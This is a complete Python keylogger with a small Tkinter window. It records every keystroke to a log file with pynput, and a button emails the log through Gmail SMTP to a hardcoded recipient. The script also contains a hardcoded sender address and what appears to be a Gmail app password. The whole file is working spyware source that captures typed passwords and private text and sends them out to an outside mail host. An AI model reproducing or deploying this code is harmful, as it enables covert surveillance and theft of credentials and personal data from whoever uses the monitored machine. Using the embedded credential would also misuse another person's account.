from pynput.keyboard import Listener 
import logging
import smtplib
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders
from tkinter import *

root = Tk()
root.title("KeyWatcher")
root.geometry('350x200')

 
log_dir = r"D:/Hacvker/"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
keylogger_running = False
listener = None




def output(key):
    logging.info(str(key))

# send logged file to email 
def send_email_with_attachment():
    fromaddr = "kuro113202@gmail.com"
    toaddr = "voxuanthien.12c1tn@gmail.com"

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Test"
    body = "Logged files"
    msg.attach(MIMEText(body, 'plain'))
    filename = "keyLog.txt"
    attachment = open("D:/Hacvker/keyLog.txt", "rb")
    p = MIMEBase('application', 'octet-stream') 
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p) 
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    s.starttls()
    s.login(fromaddr, "jhxv oszu eyof ulkf") 
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit() 
 

def start_keylogger():
    global keylogger_running,listener
    if keylogger_running:
        listener.stop()
        listener = None
        toggle_button.config(text="Start Keylogger")
        keylogger_running = False
    else:
        listener = Listener(on_press=output)
        listener.start()
        toggle_button.config(text="Stop Keylogger")
        keylogger_running = True





toggle_button = Button(root, text="Start Keylogger", command=start_keylogger)
toggle_button.pack(pady=20)

send_button = Button(root, text="Send email", command=send_email_with_attachment)
send_button.pack(pady=20)

root.mainloop()
